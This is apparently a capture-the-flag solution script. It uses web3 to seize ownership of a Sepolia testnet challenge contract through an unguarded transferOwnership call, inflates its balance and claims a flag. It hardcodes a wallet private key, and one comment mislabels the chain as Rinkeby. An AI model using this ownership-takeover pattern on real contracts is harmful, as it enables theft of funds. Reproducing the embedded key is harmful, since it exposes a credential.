from web3 import Web3

# Connect to Sepolia Testnet
w3 = Web3(Web3.HTTPProvider('https://rpc.ankr.com/eth_sepolia'))

# Check if connected
if not w3.is_connected():
    print("Not connected!")
    exit()

# Your MetaMask account and private key
my_account = '0xfE33EA527eF2FDB46Df9B8548dC13882B486435d'
private_key = 'b90e0528b2b8ddea9925fcc822c997e29d6caf811868d41716c5afcdd6385c46'  # !!! NEVER HARDCODE THIS IN PRODUCTION SCRIPTS !!!

contract_abi = [
    {
        "constant": False,
        "inputs": [{"name": "addr", "type": "address"}, {"name": "amount", "type": "uint256"}],
        "name": "increaseBalance",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": False,
        "inputs": [{"name": "addr", "type": "address"}, {"name": "amount", "type": "uint256"}],
        "name": "decreaseBalance",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": False,
        "inputs": [],
        "name": "clearMessage",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": False,
        "inputs": [],
        "name": "register",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": False,
        "inputs": [{"name": "to", "type": "address"}, {"name": "amount", "type": "uint256"}],
        "name": "transfer",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": False,
        "inputs": [{"name": "message", "type": "string"}],
        "name": "setMessage",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": False,
        "inputs": [{"name": "to", "type": "address"}],
        "name": "transferOwnership",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": False,
        "inputs": [],
        "name": "burn",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": False,
        "inputs": [{"name": "amount", "type": "uint256"}],
        "name": "burn",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": False,
        "inputs": [{"name": "flag", "type": "bytes16"}],
        "name": "getFlag",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "anonymous": False,
        "inputs": [{"indexed": False, "name": "flag", "type": "bytes16"}],
        "name": "GetFlag",
        "type": "event"
    },
    {
        "anonymous": False,
        "inputs": [{"indexed": True, "name": "addr", "type": "address"}],
        "name": "Registered",
        "type": "event"
    },
    {
        "anonymous": False,
        "inputs": [{"indexed": True, "name": "addr", "type": "address"}, {"indexed": False, "name": "amount", "type": "uint256"}],
        "name": "IncreasedBalance",
        "type": "event"
    },
    {
        "anonymous": False,
        "inputs": [{"indexed": True, "name": "addr", "type": "address"}, {"indexed": False, "name": "amount", "type": "uint256"}],
        "name": "DecreaseBalance",
        "type": "event"
    },
    {
        "anonymous": False,
        "inputs": [{"indexed": True, "name": "from", "type": "address"}, {"indexed": True, "name": "to", "type": "address"}, {"indexed": False, "name": "amount", "type": "uint256"}],
        "name": "Transfer",
        "type": "event"
    },
    {
        "anonymous": False,
        "inputs": [{"indexed": True, "name": "addr", "type": "address"}, {"indexed": False, "name": "message", "type": "string"}],
        "name": "SetMessage",
        "type": "event"
    }
]


# Contract address & ABI
contract_address = Web3.to_checksum_address('0x263e83C88970B6832Fab14b8Ff575Cbe599922Cb')
contract = w3.eth.contract(address=contract_address, abi=contract_abi)

def send_transaction(function, *args):
    nonce = w3.eth.get_transaction_count(my_account)
    gas_estimate = function(*args).estimate_gas({'from': my_account})
    txn = function(*args).build_transaction({
        'chainId': 11155111,  # for Rinkeby Testnet
        'gas': gas_estimate,
        'gasPrice': w3.to_wei('20', 'gwei'),
        'nonce': nonce,
    })
    signed_txn = w3.eth.account.sign_transaction(txn, private_key)
    return w3.eth.send_raw_transaction(signed_txn.rawTransaction)
# Function to estimate gas and ether required for a transaction
def estimate_gas_and_eth(function, *args):
    gas_estimate = function(*args).estimate_gas({'from': my_account})
    gas_price = w3.to_wei('20', 'gwei')
    return gas_estimate, gas_estimate * gas_price

# Estimate gas and ether required for transferOwnership transaction
gas_required, eth_required = estimate_gas_and_eth(contract.functions.transferOwnership, my_account)

print(f"Gas required for transferOwnership: {gas_required}")
print(f"Ether required for transferOwnership: {w3.from_wei(eth_required, 'ether')} Ether")

# Ensure you have enough balance
if w3.eth.get_balance(my_account) < eth_required:
    print(f"Not enough Ether to perform transferOwnership. You need {w3.from_wei(eth_required, 'ether')} Ether.")
    exit()

# Call transferOwnership function
tx_hash = send_transaction(contract.functions.transferOwnership, my_account)
w3.eth.wait_for_transaction_receipt(tx_hash)

# Increase your balance
amount = 2000
tx_hash = send_transaction(contract.functions.increaseBalance, my_account, amount)
w3.eth.wait_for_transaction_receipt(tx_hash)

# Get the flag using the provided token
token = '0x1132605dd5ebafa4ebfaa880604e824a'
tx_hash = send_transaction(contract.functions.getFlag, token)
w3.eth.wait_for_transaction_receipt(tx_hash)

print("Done!")
